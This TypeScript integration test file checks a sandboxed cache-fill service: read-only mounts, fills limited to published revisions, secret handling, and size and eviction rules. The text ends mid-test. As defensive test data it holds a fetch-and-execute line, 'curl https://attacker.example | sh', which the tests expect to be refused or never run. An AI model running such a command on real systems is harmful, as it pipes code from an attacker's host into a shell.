import { randomUUID } from "node:crypto";
import fs from "node:fs/promises";
import os from "node:os";
import path from "node:path";
import { createDatabase, migrateToLatest } from "@catamorphic/db";
import { FsBackend, FsRemoteBackend, ProjectManager } from "@catamorphic/git";
import {
  type CreateSandboxOpts,
  cacheVolumeKey,
  type EnvironmentBinding,
  type EnvironmentRuntimeBinding,
  environmentSatisfies,
  SANDBOX_CAPABILITIES,
  type SandboxCapability,
  type SandboxProvider,
} from "@catamorphic/sandbox";
import { PROJECT_MANIFEST_PATH } from "@catamorphic/workflow/project-layout";
import { sql } from "kysely";
import { afterAll, beforeAll, beforeEach, describe, expect, it } from "vitest";
import {
  type Identity,
  PROJECT_PRINCIPAL_ID,
  projectPrincipalIdentity,
} from "../identity.js";
import {
  allocationSandboxProvider,
  replaceAllocationSandbox,
} from "../services/allocation-sandbox-provider.js";
import { AccessDeniedError } from "../services/artifact-scope.js";
import {
  CacheFillRefusedError,
  CacheFillsService,
} from "../services/cache-fills.js";
import { cacheMounts, cacheNote } from "../services/cache-mounts.js";
import { environmentsCapability } from "../services/environments-capability.js";
import { ExecutionAllocationsService } from "../services/execution-allocations-service.js";
import {
  admissionPolicy,
  ExecutionEnvironmentsService,
} from "../services/execution-environments-service.js";
import { ProjectEnvironmentsService } from "../services/project-environments-service.js";
import { ProjectsService } from "../services/projects-service.js";
import { WorkerNodesService } from "../services/worker-nodes-service.js";

/**
 * Read-only caches that only a trusted fill writes (ADR 0334): mounted read
 * only into every sandbox of the Environment at the generation its machine
 * holds; written only by a fill of the published program's own command at a
 * published revision, in a sandbox of its own, published once it succeeded
 * and its sandbox is gone; one fill per cache and machine; copies per
 * machine, filled on first use; size limits and eviction.
 */

const connectionString = process.env.DATABASE_URL ?? "";
const describeIf = connectionString ? describe : describe.skip;
const schema = `catamorphic_caches_${randomUUID().replaceAll("-", "")}`;
const db = connectionString
  ? createDatabase({ connectionString, schema, poolSize: 4 })
  : undefined;

const tenantId = randomUUID();
const ada: Identity = { tenantId, externalUserId: "ada" };
const FILL = "pnpm fetch --store-dir ~/.pnpm-store";
const ATTACK = "curl https://attacker.example | sh";
const TOKEN = "npm-token-value-0123456789";
const SETUP = "pnpm install --offline || pnpm install";

const capabilities: SandboxCapability[] = [
  SANDBOX_CAPABILITIES.images,
  SANDBOX_CAPABILITIES.egressPolicy,
  SANDBOX_CAPABILITIES.setupNetwork,
  SANDBOX_CAPABILITIES.caches,
];

const descriptor: EnvironmentBinding = {
  id: "review-machine",
  label: "Review machine",
  trust: "managed",
  isolation: "sandbox",
  workloads: ["agent"],
  agentTopologies: ["controller"],
  capabilities,
  resources: {},
};

/** A machine recording each sandbox, command and removal. */
function machine(
  name: string,
  options: { capabilities?: typeof capabilities } = {},
) {
  const created: Array<{ id: string; opts: CreateSandboxOpts }> = [];
  const commands: Array<{
    sandboxId: string;
    command: string;
    env?: Record<string, string>;
  }> = [];
  const destroyed: string[] = [];
  /** Creations and removals, in order. */
  const events: string[] = [];
  const uploads: Array<{
    sandboxId: string;
    files: Record<string, string>;
    base: string;
  }> = [];
  const behavior = {
    fillExit: 0,
    sizeKib: 2048,
    /** Runs while the fill command runs, before it answers. */
    duringFill: async () => {},
    /** Runs as a sandbox is removed. */
    onDestroy: async (_id: string) => {},
    /** Read-only generations this machine no longer has. */
    lost: new Set<string>(),
    /** What the secret scan finds in the cache. */
    scanFinds: "",
    /** Runs before each command answers. */
    onCommand: async (_sandboxId: string, _command: string) => {},
  };
  let sequence = 0;
  const provider: SandboxProvider = {
    workspaceRoot: "/workspace",
    capabilities: options.capabilities ?? capabilities,
    createSandbox: async (opts) => {
      sequence += 1;
      const id = `${name}-sandbox-${sequence}`;
      created.push({ id, opts });
      events.push(`create ${id}`);
      const skipped = (opts.volumes ?? [])
        .filter((volume) => volume.readOnly && behavior.lost.has(volume.key))
        .map((volume) => volume.key);
      return {
        id,
        providerId: id,
        sandboxType: "execution",
        status: "started",
        ...(skipped.length > 0 ? { skippedVolumes: skipped } : {}),
      };
    },
    destroySandbox: async (id) => {
      await behavior.onDestroy(id);
      destroyed.push(id);
      events.push(`destroy ${id}`);
    },
    startSandbox: async () => {},
    stopSandbox: async () => {},
    getSandboxStatus: async () => "started",
    executeCommand: async (sandboxId, command, opts) => {
      commands.push({
        sandboxId,
        command,
        ...(opts?.env ? { env: opts.env } : {}),
      });
      await behavior.onCommand(sandboxId, command);
      if (command === FILL) {
        await behavior.duringFill();
        return { exitCode: behavior.fillExit, result: "fetched\n" };
      }
      if (command.includes("du -sk"))
        return { exitCode: 0, result: `${behavior.sizeKib}\n` };
      if (command.includes("grep -rqF -f"))
        return { exitCode: 0, result: behavior.scanFinds };
      return { exitCode: 0, result: "" };
    },
    uploadFiles: async (sandboxId, files, base) => {
      uploads.push({ sandboxId, files, base });
    },
    downloadFile: async () => "",
    gitClone: async () => {},
    gitCheckout: async () => {},
  };
  return { provider, created, commands, destroyed, events, uploads, behavior };
}

describeIf("Environment caches (ADR 0334)", () => {
  let tmpDir: string;
  let projectId: string;
  let projectManager: ProjectManager;
  let published: string;
  let nodes: WorkerNodesService;
  const machines = new Map<
    string,
    {
      lease: { id: string; token: string };
      fake: ReturnType<typeof machine>;
      trust: EnvironmentBinding["trust"];
    }
  >();
  let fills: CacheFillsService;
  let fillDeps: ConstructorParameters<typeof CacheFillsService>[0];
  let environments: ExecutionEnvironmentsService;
  const allocations = () => new ExecutionAllocationsService(db!);

  const manifest = (
    fillCommand: string,
    variant: { image?: string; setupAllow?: string[] } = {},
  ) =>
    JSON.stringify({
      environments: {
        review: {
          workloads: ["agent"],
          image: variant.image ?? "node:22",
          network: { egress: "allowlist", allow: ["api.example.com"] },
          secrets: ["NPM_TOKEN"],
          setup: {
            command: SETUP,
            network: { allow: variant.setupAllow ?? ["registry.npmjs.org"] },
            secrets: ["NPM_TOKEN"],
          },
          caches: {
            pnpm: {
              path: "~/.pnpm-store",
              sizeMb: 4,
              fill: { command: fillCommand },
            },
          },
        },
      },
      defaultEnvironment: "review",
    });

  const addMachine = async (
    name: string,
    options: {
      trust?: EnvironmentBinding["trust"];
      capabilities?: typeof capabilities;
    } = {},
  ) => {
    const lease = await nodes.register({
      tenantId,
      authorityId: `caches-${name}`,
      descriptor: {
        ...descriptor,
        id: `${descriptor.id}-${name}`,
        ...(options.trust ? { trust: options.trust } : {}),
      },
    });
    const fake = machine(name, options);
    machines.set(lease.id, {
      lease,
      fake,
      trust: options.trust ?? descriptor.trust,
    });
    return { lease, fake };
  };

  beforeAll(async () => {
    if (!db) throw new Error("unreachable");
    await migrateToLatest({ db, schema });
    tmpDir = await fs.mkdtemp(path.join(os.tmpdir(), "catamorphic-caches-"));
    await fs.mkdir(path.join(tmpDir, "dev"));
    await fs.mkdir(path.join(tmpDir, "origin"));
    projectManager = new ProjectManager(
      new FsBackend(path.join(tmpDir, "dev")),
      new FsRemoteBackend(path.join(tmpDir, "origin")),
    );
    const projects = new ProjectsService(db, projectManager, [], {
      seedFiles: {},
    });
    projectId = (await projects.create(ada, { name: "Caches" })).id;
    const done = await projectManager.publishFiles({
      tenantId,
      projectId,
      files: { [PROJECT_MANIFEST_PATH]: manifest(FILL) },
      message: "Caches",
      author: { name: "Test", email: "test@example.com" },
    });
    if (done.status !== "deployed") throw new Error("not published");
    published = done.commitSha;
    await db
      .insertInto("published_revisions")
      .values({
        tenant_id: tenantId,
        project_id: projectId,
        commit_sha: published,
        status: "applied",
      })
      .execute();
    nodes = new WorkerNodesService(db);
    const projectEnvironments = new ProjectEnvironmentsService(
      db,
      projectManager,
    );
    environments = new ExecutionEnvironmentsService(projectEnvironments, {
      get: ({ requirements, workerNodeId }) => {
        const entries = [...machines.values()];
        const chosen = workerNodeId
          ? machines.get(workerNodeId)
          : entries.find(
              (entry) =>
                !requirements ||
                environmentSatisfies(
                  { ...descriptor, id: entry.lease.id },
                  requirements,
                ).compatible,
            );
        if (!chosen) return undefined;
        const binding: EnvironmentRuntimeBinding = {
          descriptor: {
            ...descriptor,
            id: `${descriptor.id}-${chosen.lease.id}`,
            trust: chosen.trust,
          },
          workerNodeId: chosen.lease.id,
          workerLeaseToken: chosen.lease.token,
          sandboxProvider: chosen.fake.provider,
        };
        return binding;
      },
    });
    fillDeps = {
      db,
      projectManager,
      projectEnvironments,
      executionEnvironments: environments,
      executionAllocations: allocations(),
      secrets: () => ({
        resolveForSandbox: async () => ({
          variables: { NPM_TOKEN: TOKEN, OTHER: "other-secret-value" },
          delivered: [],
          missing: [],
          unmasked: [],
        }),
      }),
      retentionDays: 30,
      claimRenewMs: 50,
    };
    fills = new CacheFillsService(fillDeps);
  }, 120_000);

  beforeEach(async () => {
    await db!.deleteFrom("environment_cache_fills").execute();
    await db!.deleteFrom("environment_cache_requests").execute();
    for (const { fake } of machines.values()) {
      fake.created.length = 0;
      fake.commands.length = 0;
      fake.destroyed.length = 0;
      fake.behavior.fillExit = 0;
      fake.behavior.sizeKib = 2048;
      fake.behavior.duringFill = async () => {};
      fake.behavior.onDestroy = async () => {};
      fake.behavior.lost.clear();
      fake.behavior.onCommand = async () => {};
      fake.behavior.scanFinds = "";
      fake.events.length = 0;
      fake.uploads.length = 0;
    }
  });

  afterAll(async () => {
    if (db) {
      await sql`drop schema if exists ${sql.id(schema)} cascade`.execute(db);
      await db.destroy();
    }
    if (tmpDir) await fs.rm(tmpDir, { recursive: true, force: true });
  });

  /** A review chat's workspace on a machine: its Allocation and sandbox. */
  const workspace = async (node: string) => {
    const admission = await environments.admit({
      identity: projectPrincipalIdentity({
        tenantId,
        projectId,
        environment: "review",
      }),
      projectId,
      owner: null,
      environment: "review",
      workerNodeId: node,
      requirements: { workload: "agent", topology: "controller" },
    });
    const entry = machines.get(node);
    if (!entry) throw new Error("no machine");
    const allocation = await allocations().create({
      identity: ada,
      projectId,
      environmentName: "review",
      workloadKind: "agent",
      rootWorkloadId: randomUUID(),
      workerNodeId: node,
      policy: admissionPolicy({ admission, connections: [] }),
    });
    const provider = allocationSandboxProvider({
      db: db!,
      allocation,
      provider: entry.fake.provider,
      workerLeaseToken: entry.lease.token,
    });
    const handle = await provider.createSandbox({});
    return {
      allocation,
      sandboxId: handle.providerId,
      opts: entry.fake.created.at(-1)?.opts,
    };
  };

  const fillRows = () =>
    db!
      .selectFrom("environment_cache_fills")
      .selectAll()
      .orderBy("created_at")
      .execute();

  const key = (generation: number) =>
    cacheVolumeKey({
      projectId,
      environment: "review",
      name: "pnpm",
      generation,
    });

  /** Run every due fill to its end. */
  const fillAll = async () => {
    await fills.dispatch();
    await fills.drain();
  };

  it("fills a machine on first use, then mounts its copy read only into agent and setup sandboxes", async () => {
    const { lease, fake } = await addMachine("a");
    // The machine has no copy: nothing is mounted, and a fill is queued.
    const first = await workspace(lease.id);
    expect(first.opts?.volumes ?? []).toEqual([]);
    expect(
      await cacheNote({ db: db!, allocation: first.allocation }),
    ).toContain("this machine has no copy");
    const queued = await fillRows();
    expect(queued).toMatchObject([
      {
        worker_node_id: lease.id,
        status: "queued",
        reason: "first-use",
        cache_name: "pnpm",
      },
    ]);
    // A second workspace there meanwhile joins it rather than queueing more.
    await workspace(lease.id);
    expect(await fillRows()).toHaveLength(1);

    fake.created.length = 0;
    fake.events.length = 0;
    await fillAll();
    const [filled] = await fillRows();
    expect(filled).toMatchObject({
      status: "succeeded",
      commit_sha: published,
      size_bytes: String(2048 * 1024),
    });
    const generation = Number(filled?.generation);

    // The fill's own sandbox: the cache writable at its new generation and
    // nothing else, on the setup's network as its own, the published
    // program's command, no secrets, and removed before publishing.
    const fillSandbox = fake.created.find(
      (entry) => entry.opts.labels?.purpose === "cache-fill",
    );
    // Checked after the fill's sandbox is gone, from a fresh helper that
    // mounts the generation read only.
    const helper = fake.created.find(
      (entry) => entry.opts.labels?.purpose === "cache-check",
    );
    expect(fake.created).toHaveLength(2);
    expect(helper?.opts.volumes).toEqual([
      { key: key(generation), path: "/work-cache-check", readOnly: true },
    ]);
    // Cut off from every network, with nothing of the Environment's: the
    // secrets it searches for can reach nothing.
    expect(helper?.opts.internal).toBe(true);
    expect(helper?.opts.egress).toBeUndefined();
    expect(helper?.opts.image).toBeUndefined();
    expect(fake.events).toEqual([
      `create ${fillSandbox?.id}`,
      `destroy ${fillSandbox?.id}`,
      `create ${helper?.id}`,
      `destroy ${helper?.id}`,
    ]);
    expect(
      fake.commands.find((command) => command.command.includes("du -sk"))
        ?.sandboxId,
    ).toBe(helper?.id);
    expect(fillSandbox?.opts.volumes).toEqual([
      { key: key(generation), path: "~/.pnpm-store" },
    ]);
    expect(fillSandbox?.opts.egress).toEqual({
      mode: "allowlist",
      allow: ["registry.npmjs.org"],
    });
    expect(fillSandbox?.opts.image).toEqual({
      kind: "oci",
      reference: "node:22",
    });
    const ran = fake.commands.filter(
      (command) => command.sandboxId === fillSandbox?.id,
    );
    // Only the secrets the setup names, never in a command line.
    expect(ran.find((command) => command.command === FILL)?.env).toEqual({
      NPM_TOKEN: TOKEN,
    });
    expect(ran.some((command) => command.command.includes(TOKEN))).toBe(false);
    expect(
      ran.some((command) => command.command.includes(".work-cache.json")),
    ).toBe(true);
    expect(fake.destroyed).toContain(fillSandbox?.id);

    // Agent sandboxes mount it read only.
    const agent = await workspace(lease.id);
    expect(agent.opts?.volumes).toEqual([
      { key: key(generation), path: "~/.pnpm-store", readOnly: true },
    ]);
    expect(
      await cacheNote({ db: db!, allocation: agent.allocation }),
    ).toContain(`filled from main at ${published.slice(0, 12)}`);
    // So does the sandbox a setup on its own network replaces it with.
    await replaceAllocationSandbox({
      db: db!,
      allocation: agent.allocation,
      provider: fake.provider,
      sandboxId: agent.sandboxId,
      workerLeaseToken: lease.token,
    });
    await allocationSandboxProvider({
      db: db!,
      allocation: agent.allocation,
      provider: fake.provider,
      workerLeaseToken: lease.token,
    }).createSandbox({});
    expect(fake.created.at(-1)?.opts.volumes).toEqual([
      { key: key(generation), path: "~/.pnpm-store", readOnly: true },
    ]);
  });

  it("publishes a fill only once it succeeded and its sandbox is gone; a failed one leaves the old cache", async () => {
    const { lease, fake } = await addMachine("b");
    await workspace(lease.id);
    await fillAll();
    const old = Number((await fillRows())[0]?.generation);

    // While the next fill runs, and until its sandbox is gone, new
    // sandboxes still mount the old generation.
    const seen: unknown[] = [];
    const mounted = async () => {
      const { opts } = await workspace(lease.id);
      seen.push(opts?.volumes?.[0]?.key);
    };
    fake.behavior.duringFill = mounted;
    fake.behavior.onDestroy = mounted;
    await fills.request({
      identity: ada,
      projectId,
      environment: "review",
      cache: "pnpm",
      idempotencyKey: "deploy-1",
    });
    await fillAll();
    const next = (await fillRows()).at(-1);
    expect(next?.status).toBe("succeeded");
    // While the command runs, as the fill's sandbox goes, as the helper's.
    expect(seen).toEqual([key(old), key(old), key(old)]);
    fake.behavior.duringFill = async () => {};
    fake.behavior.onDestroy = async () => {};
    expect((await workspace(lease.id)).opts?.volumes?.[0]?.key).toBe(
      key(Number(next?.generation)),
    );

    // A failed fill and one past its size leave the cache as it was.
    const current = Number(next?.generation);
    fake.behavior.fillExit = 1;
    await fills.request({
      identity: ada,
      projectId,
      environment: "review",
      cache: "pnpm",
      idempotencyKey: "deploy-2",
    });
    await fillAll();
    expect((await fillRows()).at(-1)).toMatchObject({
      status: "failed",
      error: expect.stringContaining("The fill command exited 1"),
    });
    fake.behavior.fillExit = 0;
    fake.behavior.sizeKib = 5 * 1024;
    await fills.request({
      identity: ada,
      projectId,
      environment: "review",
      cache: "pnpm",
      idempotencyKey: "deploy-3",
    });
    await fillAll();
    expect((await fillRows()).at(-1)).toMatchObject({
      status: "failed",
      error: expect.stringContaining("its limit is 4 MiB"),
    });
    expect((await workspace(lease.id)).opts?.volumes?.[0]?.key).toBe(
      key(current),
    );
  });

  it("runs one fill per cache and machine at a time", async () => {
    const { lease, fake } = await addMachine("c");
    await workspace(lease.id);
    await fillAll();
    // Requests while one waits join it; their keys answer the same fill.
    const first = await fills.request({
      identity: ada,
      projectId,
      environment: "review",
      cache: "pnpm",
      idempotencyKey: "a",
    });
    const second = await fills.request({
      identity: ada,
      projectId,
      environment: "review",
      cache: "pnpm",
      idempotencyKey: "b",
    });
    expect(second.fills.map((fill) => fill.id)).toEqual(
      first.fills.map((fill) => fill.id),
    );
    // While it runs, a new request waits behind it and no pass starts it.
    let release: () => void = () => {};
    const gate = new Promise<void>((resolve) => {
      release = resolve;
    });
    const passes: number[] = [];
    fake.behavior.duringFill = async () => {
      await fills.request({
        identity: ada,
        projectId,
        environment: "review",
        cache: "pnpm",
        idempotencyKey: "c",
      });
      passes.push(await fills.dispatch());
      await gate;
    };
    await fills.dispatch();
    while (passes.length === 0)
      await new Promise((resolve) => setTimeout(resolve, 20));
    expect(passes).toEqual([0]);
    const states = (await fillRows()).filter(
      (row) => row.worker_node_id === lease.id,
    );
    expect(states.map((row) => row.status)).toEqual([
      "succeeded",
      "running",
      "queued",
    ]);
    // The database refuses a second running fill outright.
    const running = states.find((row) => row.status === "running");
    await expect(
      db!
        .updateTable("environment_cache_fills")
        .set({ status: "running" })
        .where("id", "=", states[2]?.id ?? "")
        .execute(),
    ).rejects.toThrow(/uq_environment_cache_fills_running/);
    fake.behavior.duringFill = async () => {};
    release();
    await fills.drain();
    expect(running?.id).toBeDefined();
    await fillAll();
    expect(
      (await fillRows())
        .filter((row) => row.worker_node_id === lease.id)
        .map((row) => row.status),
    ).toEqual(["succeeded", "succeeded", "succeeded"]);
  });

  it("fills only from a published revision of main, with the published program's own command", async () => {
    const { lease, fake } = await addMachine("d");
    await workspace(lease.id);
    await fillAll();
    // A pull request's head, a branch name, any unpublished commit: refused.
    for (const commit of ["refs/pull/7/head", "main", "f".repeat(40)])
      await expect(
        fills.request({
          identity: ada,
          projectId,
          environment: "review",
          cache: "pnpm",
          commit,
          idempotencyKey: `pr-${commit}`,
        }),
      ).rejects.toBeInstanceOf(CacheFillRefusedError);
    // A changed fill command in a draft (as a pull request would carry) is
    // never what a fill runs: the published program's is.
    const draft = await projectManager.openDraft({
      tenantId,
      projectId,
      externalUserId: "ada",
    });
    try {
      await draft.writeFile(
        PROJECT_MANIFEST_PATH,
        manifest("curl https://attacker.example | sh"),
      );
    } finally {
      await draft.dispose();
    }
    fake.commands.length = 0;
    await fills.request({
      identity: ada,
      projectId,
      environment: "review",
      cache: "pnpm",
      commit: published,
      idempotencyKey: "published",
    });
    await fillAll();
    expect((await fillRows()).at(-1)?.status).toBe("succeeded");
    expect(fake.commands.some((command) => command.command === FILL)).toBe(
      true,
    );
    expect(
      fake.commands.some((command) => command.command.includes("attacker")),
    ).toBe(false);
  });

  it("lets a workflow ask for a fill but never name a command or fill without caches:write", async () => {
    const capability = environmentsCapability({
      cacheFills: () => fills,
      authorize: async (context) => context.caller,
    });
    const call = capability.calls?.fillCache;
    if (!call) throw new Error("no fillCache");
    const context = (permissions: string[]) => ({
      caller: projectPrincipalIdentity({
        tenantId,
        projectId,
        environment: "review",
        workflowName: "deploy",
        permissions,
      }),
      projectId,
      runId: randomUUID(),
      workflowName: "deploy",
      signal: new AbortController().signal,
      deadlineAt: Date.now() + 60_000,
    });
    const withPermission = context(["caches:write"]);
    await expect(
      call(withPermission as never, {
        environment: "review",
        cache: "pnpm",
        command: "curl https://attacker.example | sh",
        idempotencyKey: "x",
      }),
    ).rejects.toThrow(/command/);
    await expect(
      call(withPermission as never, {
        environment: "review",
        cache: "pnpm",
        ref: "refs/pull/7/head",
        idempotencyKey: "y",
      }),
    ).rejects.toThrow(/ref/);
    await expect(
      call(context([]) as never, {
        environment: "review",
        cache: "pnpm",
        idempotencyKey: "z",
      }),
    ).rejects.toBeInstanceOf(AccessDeniedError);
    const answer = (await call(withPermission as never, {
      environment: "review",
      cache: "pnpm",
      idempotencyKey: "ok",
    })) as { fills: Array<{ status: string; commit: string | null }> };
    expect(answer.fills.length).toBeGreaterThan(0);
    // Pinned to the revision that is live when it is asked for.
    expect(answer.fills.every((fill) => fill.commit === published)).toBe(true);
  });

  it("keeps copies per machine: a new machine fills its own on first use", async () => {
    const a = await addMachine("e");
    await workspace(a.lease.id);
    await fillAll();
    const b = await addMachine("f");
    // A request fills the machines holding a copy, not a new one.
    const requested = await fills.request({
      identity: ada,
      projectId,
      environment: "review",
      cache: "pnpm",
      idempotencyKey: "fan-out",
    });
    expect(requested.fills.map((fill) => fill.machine)).not.toContain(
      b.lease.id,
    );
    const fresh = await workspace(b.lease.id);
    expect(fresh.opts?.volumes ?? []).toEqual([]);
    await fillAll();
    const own = (await fillRows()).find(
      (row) => row.worker_node_id === b.lease.id && row.status === "succeeded",
    );
    expect(own).toBeDefined();
    expect(b.fake.created.some((entry) => entry.opts.volumes?.length)).toBe(
      true,
    );
    expect((await workspace(b.lease.id)).opts?.volumes).toEqual([
      {
        key: key(Number(own?.generation)),
        path: "~/.pnpm-store",
        readOnly: true,
      },
    ]);
    const listed = await fills.list({ identity: ada, projectId });
    expect(listed).toHaveLength(1);
    expect(listed[0]?.copies.map((copy) => copy.machine)).toEqual(
      expect.arrayContaining([a.lease.id, b.lease.id]),
    );
  });

  it("evicts a copy nobody mounted for the retention period", async () => {
    const { lease } = await addMachine("g");
    await workspace(lease.id);
    await fillAll();
    expect((await workspace(lease.id)).opts?.volumes).toHaveLength(1);
    await db!
      .updateTable("environment_cache_fills")
      .set({ last_used_at: sql<Date>`now() - interval '31 days'` })
      .where("worker_node_id", "=", lease.id)
      .execute();
    await fills.dispatch();
    expect(
      (await fillRows()).find((row) => row.worker_node_id === lease.id)?.status,
    ).toBe("evicted");
    // Never mounted again; the next workspace queues a fill.
    const after = await workspace(lease.id);
    expect(after.opts?.volumes ?? []).toEqual([]);
    expect(
      (await fillRows()).filter(
        (row) => row.worker_node_id === lease.id && row.status === "queued",
      ),
    ).toHaveLength(1);
    await fills.drain();
  });

  it("gives the project's caches to every owner's sandboxes, and none to a fill but its own", async () => {
    const { lease } = await addMachine("h");
    const { allocation } = await workspace(lease.id);
    expect(allocation.policy.sandbox?.caches).toEqual([
      { name: "pnpm", path: "~/.pnpm-store" },
    ]);
    expect(
      await cacheMounts({
        db: db!,
        allocation: {
          ...allocation,
          policy: {
            ...allocation.policy,
            sandbox: {
              ...allocation.policy.sandbox,
              fill: { name: "pnpm", path: "~/.pnpm-store", key: key(99) },
            },
          },
        },
      }).then((mounts) => mounts.volumes),
    ).toEqual([{ key: key(99), path: "~/.pnpm-store" }]);
    expect(PROJECT_PRINCIPAL_ID).toBeTruthy();
    await fills.drain();
  });

  /** The fill row of one machine, newest first. */
  const rowsOf = async (node: string) =>
    (await fillRows()).filter((row) => row.worker_node_id === node).reverse();

  it("releases what an exhausted fill held before failing it, so its machine takes work again", async () => {
    const { lease } = await addMachine("i");
    const [row] = await db!
      .insertInto("environment_cache_fills")
      .values({
        tenant_id: tenantId,
        project_id: projectId,
        environment_name: "review",
        cache_name: "pnpm",
        worker_node_id: lease.id,
        reason: "requested",
        status: "running",
        attempts: 3,
        generation: "900",
        claimed_until: sql<Date>`now() - interval '1 minute'`,
      })
      .returning("id")
      .execute();
    const held = await allocations().create({
      identity: ada,
      projectId,
      environmentName: "review",
      workloadKind: "agent",
      rootWorkloadId: row?.id ?? "",
      workerNodeId: lease.id,
      policy: {
        binding: descriptor,
        requirements: { workload: "agent" },
      },
    });
    await fills.dispatch();
    expect((await rowsOf(lease.id))[0]?.status).toBe("failed");
    expect(
      (
        await db!
          .selectFrom("execution_allocations")
          .select("status")
          .where("id", "=", held.id)
          .executeTakeFirstOrThrow()
      ).status,
    ).toBe("released");
  });

  it("forgets a copy its machine lost and fills the machine again, telling the agent", async () => {
    const { lease, fake } = await addMachine("j");
    await workspace(lease.id);
    await fillAll();
    const [copy] = await rowsOf(lease.id);
    await db!
      .updateTable("environment_cache_fills")
      .set({ last_used_at: sql<Date>`now() - interval '2 days'` })
      .where("id", "=", copy?.id ?? "")
      .execute();
    fake.behavior.lost.add(key(Number(copy?.generation)));
    const { allocation } = await workspace(lease.id);
    const rows = await rowsOf(lease.id);
    const forgotten = rows.find((row) => row.id === copy?.id);
    expect(forgotten?.status).toBe("evicted");
    // Not counted as used: nothing mounted it.
    expect(forgotten?.last_used_at?.getTime()).toBeLessThan(
      Date.now() - 24 * 3600_000,
    );
    expect(
      rows.filter(
        (row) => row.status === "queued" && row.reason === "first-use",
      ),
    ).toHaveLength(1);
    expect(await cacheNote({ db: db!, allocation })).toContain(
      "this machine has no copy",
    );
    await fillAll();
  });

  it("empties a failed generation and retires every generation but the live one and the one being filled", async () => {
    const { lease, fake } = await addMachine("k");
    await workspace(lease.id);
    await fillAll();
    const live = Number((await rowsOf(lease.id))[0]?.generation);
    fake.behavior.fillExit = 1;
    await fills.request({
      identity: ada,
      projectId,
      environment: "review",
      cache: "pnpm",
      idempotencyKey: "fails",
    });
    fake.commands.length = 0;
    await fillAll();
    const failed = (await rowsOf(lease.id))[0];
    expect(failed?.status).toBe("failed");
    const failedSandbox = fake.created.at(-1)?.id;
    expect(
      fake.commands.some(
        (command) =>
          command.sandboxId === failedSandbox &&
          command.command.includes("-exec rm -rf {} +"),
      ),
    ).toBe(true);
    // A review sandbox mounts the live one and retires the failed one.
    const review = await workspace(lease.id);
    expect(review.opts?.volumes).toEqual([
      {
        key: key(live),
        path: "~/.pnpm-store",
        readOnly: true,
        retire: [key(Number(failed?.generation))],
      },
    ]);
    // The next fill writes its own and retires the failed one, keeping the
    // live one that sandboxes still read.
    fake.behavior.fillExit = 0;
    await fills.request({
      identity: ada,
      projectId,
      environment: "review",
      cache: "pnpm",
      idempotencyKey: "recovers",
    });
    await fillAll();
    const fill = fake.created.find(
      (entry) =>
        entry.opts.volumes?.length === 1 &&
        entry.opts.volumes[0]?.readOnly === undefined &&
        entry.opts.volumes[0]?.retire !== undefined,
    );
    expect(fill?.opts.volumes?.[0]?.retire).toEqual([
      key(Number(failed?.generation)),
    ]);
  });

  it("stops a fill whose Allocation was released, and one whose claim moved, without publishing", async () => {
    const { lease, fake } = await addMachine("m");
    await workspace(lease.id);
    await fillAll();
    const live = Number((await rowsOf(lease.id))[0]?.generation);
    // The Allocation is released while the command runs.
    fake.behavior.duringFill = async () => {
      await db!
        .updateTable("execution_allocations")
        .set({ status: "released", released_at: new Date() })
        .where("root_workload_id", "=", (await rowsOf(lease.id))[0]?.id ?? "")
        .execute();
    };
    await fills.request({
      identity: ada,
      projectId,
      environment: "review",
      cache: "pnpm",
      idempotencyKey: "released",
    });
    fake.commands.length = 0;
    await fillAll();
    expect((await rowsOf(lease.id))[0]).toMatchObject({
      status: "failed",
      error: expect.stringContaining("no longer active"),
    });
    expect(fake.commands.some((c) => c.command.includes("du -sk"))).toBe(false);
    // Another run takes the claim over while this one's command runs.
    fake.behavior.duringFill = async () => {
      await db!
        .updateTable("environment_cache_fills")
        .set({ generation: "999999" })
        .where("id", "=", (await rowsOf(lease.id))[0]?.id ?? "")
        .execute();
      await new Promise((resolve) => setTimeout(resolve, 300));
    };
    await fills.request({
      identity: ada,
      projectId,
      environment: "review",
      cache: "pnpm",
      idempotencyKey: "moved",
    });
    fake.commands.length = 0;
    await fillAll();
    expect(fake.commands.some((c) => c.command.includes("du -sk"))).toBe(false);
    expect((await rowsOf(lease.id))[0]?.status).toBe("running");
    expect((await workspace(lease.id)).opts?.volumes?.[0]?.key).toBe(key(live));
  });

  it("records a fill's sandbox on its Allocation where the machine keeps its own lifecycle", async () => {
    const { lease } = await addMachine("n", { trust: "local" });
    await workspace(lease.id);
    await fillAll();
    const [row] = await rowsOf(lease.id);
    expect(row?.status).toBe("succeeded");
    const allocation = await db!
      .selectFrom("execution_allocations")
      .select(["sandbox_provider_id", "status"])
      .where("root_workload_id", "=", row?.id ?? "")
      .executeTakeFirstOrThrow();
    expect(allocation.sandbox_provider_id).toMatch(/^n-sandbox-/);
  });

  it("refuses a cache on a machine whose provider cannot keep it read only", async () => {
    const { lease } = await addMachine("o", {
      capabilities: [SANDBOX_CAPABILITIES.images, SANDBOX_CAPABILITIES.volumes],
    });
    await db!
      .insertInto("environment_cache_fills")
      .values({
        tenant_id: tenantId,
        project_id: projectId,
        environment_name: "review",
        cache_name: "pnpm",
        worker_node_id: lease.id,
        reason: "requested",
        status: "succeeded",
        generation: "5",
      })
      .execute();
    await expect(workspace(lease.id)).rejects.toThrow(
      "cannot keep a cache read only",
    );
  });

  it("counts the wait limit from the last queueing, never time behind a running fill", async () => {
    const { lease } = await addMachine("p");
    const insert = (values: { status: string; queued: string }) =>
      db!
        .insertInto("environment_cache_fills")
        .values({
          tenant_id: tenantId,
          project_id: projectId,
          environment_name: "review",
          cache_name: "pnpm",
          worker_node_id: lease.id,
          reason: "requested",
          status: values.status,
          ...(values.status === "running"
            ? {
                generation: "777",
                attempts: 1,
                claimed_until: sql<Date>`now() + interval '10 minutes'`,
              }
            : {}),
          created_at: sql<Date>`now() - interval '3 hours'`,
          queued_at: sql<Date>`now() - ${sql.raw(`interval '${values.queued}'`)}`,
        })
        .returning("id")
        .executeTakeFirstOrThrow();
    const running = await insert({ status: "running", queued: "3 hours" });
    const behind = await insert({ status: "queued", queued: "2 hours" });
    await fills.dispatch();
    expect(
      (await rowsOf(lease.id)).find((row) => row.id === behind.id)?.status,
    ).toBe("queued");
    // Asked for again just now: it waits anew once the one ahead ends.
    await db!
      .deleteFrom("environment_cache_fills")
      .where("id", "=", running.id)
      .execute();
    await db!
      .updateTable("environment_cache_fills")
      .set({ queued_at: sql<Date>`now()` })
      .where("id", "=", behind.id)
      .execute();
    await db!
      .updateTable("environment_cache_fills")
      .set({ retry_at: sql<Date>`now() + interval '1 hour'` })
      .where("id", "=", behind.id)
      .execute();
    await fills.dispatch();
    expect(
